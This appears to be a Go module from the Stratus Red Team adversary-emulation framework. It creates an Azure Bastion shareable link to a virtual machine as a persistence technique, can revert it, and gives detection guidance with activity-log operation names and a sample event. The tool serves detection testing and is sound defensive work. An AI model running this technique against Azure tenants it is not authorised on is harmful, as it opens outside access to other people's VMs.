package azure

import (
	"context"
	_ "embed"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/network/armnetwork/v6"
	"fmt"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.persistence.create-bastion-shareable-link",
		FriendlyName: "Access Virtual Machine using Bastion shareable link",
		Description: `
By utilizing the 'shareable link' feature on Bastions where it is enabled, an attacker can create a link to allow access to a virtual machine (VM) from untrusted networks. Public links generated for an Azure Bastion can allow VM network access to anyone with the generated URL.

References:

- https://blog.karims.cloud/2022/11/26/yet-another-azure-vm-persistence.html
- https://learn.microsoft.com/en-us/azure/bastion/shareable-link
- https://microsoft.github.io/Azure-Threat-Research-Matrix/Persistence/AZT509/AZT509/

Warm-up: 

- Create a VM and VNet
- Create an Azure Bastion host with access to the VM, and shareable links enabled
NOTE: Warm-up and cleanup can each take 10-15 minutes to create and destroy the Azure Bastion instance

Detonation: 

- Create an Azure Bastion shareable link with access to the VM
`,
		Detection: `
Identify Azure events of type <code>Microsoft.Network/bastionHosts/createshareablelinks/action</code> and <code>Microsoft.Network/bastionHosts/getShareablelinks/action</code>. A sample of <code>createshareablelinks</code> is shown below (redacted for clarity).

` + codeBlock + `json hl_lines="7"
{
  {
    "category": {
        "value": "Administrative",
        "localizedValue": "Administrative"
    },
    "level": "Informational",
    "operationName": {
        "value": "Microsoft.Network/bastionHosts/createshareablelinks/action",
        "localizedValue": "Creates shareable urls for the VMs under a bastion and returns the urls"
    },
    "resourceGroupName": "stratus-red-team-shareable-link-rg-tz6o",
    "resourceProviderName": {
        "value": "Microsoft.Network",
        "localizedValue": "Microsoft.Network"
    },
    "resourceType": {
        "value": "Microsoft.Network/bastionHosts",
        "localizedValue": "Microsoft.Network/bastionHosts"
    },
    "resourceId": "[removed]/resourceGroups/stratus-red-team-shareable-link-rg-tz6o/providers/Microsoft.Network/bastionHosts/stratus-red-team-shareable-link-bastion-tz6o",
    "status": {
        "value": "Succeeded",
        "localizedValue": "Succeeded"
    },
    "subStatus": {
        "value": "",
        "localizedValue": ""
    },
    "properties": {
        "eventCategory": "Administrative",
        "entity": "[removed]/resourceGroups/stratus-red-team-shareable-link-rg-tz6o/providers/Microsoft.Network/bastionHosts/stratus-red-team-shareable-link-bastion-tz6o",
        "message": "Microsoft.Network/bastionHosts/createshareablelinks/action",
        "hierarchy": "[removed]"
    },
}
` + codeBlock + `
`,
		Platform:                   stratus.Azure,
		IsSlow:                     true,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bastionName := params["bastion_name"]
	resourceGroup := params["resource_group_name"]
	vmId := params["vm_id"]
	vmName := params["vm_name"]
	tenantId := params["tenant_id"]

	ctx := context.Background()
	cred := providers.Azure().GetCredentials()
	subscriptionID := providers.Azure().SubscriptionID
	clientOptions := providers.Azure().ClientOptions

	client, err := armnetwork.NewClientFactory(subscriptionID, cred, clientOptions)
	if err != nil {
		log.Fatalf("failed to create client: %v", err)
	}

	// Create Bastion shareable link
	// Reference method: https://learn.microsoft.com/en-us/rest/api/virtualnetwork/put-bastion-shareable-link/put-bastion-shareable-link
	log.Println("Getting Bastion shareable link for VM " +vmName)

	poller, err := client.NewManagementClient().BeginPutBastionShareableLink(ctx, resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
		VMs: []*armnetwork.BastionShareableLink{
			{
				VM: &armnetwork.VM{
					ID: &vmId,
				},
			},
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to create shareable link: %v", err)
	}

	_, err = poller.PollUntilDone(ctx, nil)
	if err != nil {
		return fmt.Errorf("failed to poll results of shareable link request: %v", err)
	}
	log.Println("Shareable link created")

	// Provide URL to access Bastion shareable link
	// NOTE: Response via Go SDK methods does not return any page contents, so we'll supply a Portal URL to fetch the link for now. (The example cited in reference link above is not clear on how to resolve this.)
	url := fmt.Sprintf("https://portal.azure.com/#@%s/resource/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Network/bastionHosts/%s/shareablelinks", tenantId, subscriptionID, resourceGroup, bastionName)

	log.Println("You can view and fetch the shareable link URL here: " + url)

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// Reference method: https://learn.microsoft.com/en-us/rest/api/virtualnetwork/delete-bastion-shareable-link/delete-bastion-shareable-link?view=rest-virtualnetwork-2024-03-01&tabs=Go
	bastionName := params["bastion_name"]
	resourceGroup := params["resource_group_name"]
	vmId := params["vm_id"]
	vmName := params["vm_name"]

	ctx := context.Background()
	cred := providers.Azure().GetCredentials()
	subscriptionID := providers.Azure().SubscriptionID
	clientOptions := providers.Azure().ClientOptions

	client, err := armnetwork.NewClientFactory(subscriptionID, cred, clientOptions)
	if err != nil {
		log.Fatalf("failed to create client: %v", err)
	}

	// Delete shareable link that was previously created
	log.Println("Deleting shareable Bastion link to VM " + vmName)

	poller, err := client.NewManagementClient().BeginDeleteBastionShareableLink(ctx, resourceGroup, bastionName, armnetwork.BastionShareableLinkListRequest{
		VMs: []*armnetwork.BastionShareableLink{
			{
				VM: &armnetwork.VM{
					ID: &vmId,
				},
			},
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to delete shareable bastion link: %v", err)
	}
	_, err = poller.PollUntilDone(ctx, nil)
	if err != nil {
		return fmt.Errorf("failed to poll results of deleting shareable bastion link: %v", err)
	}

	log.Println("Shareable link deleted")

	return nil
}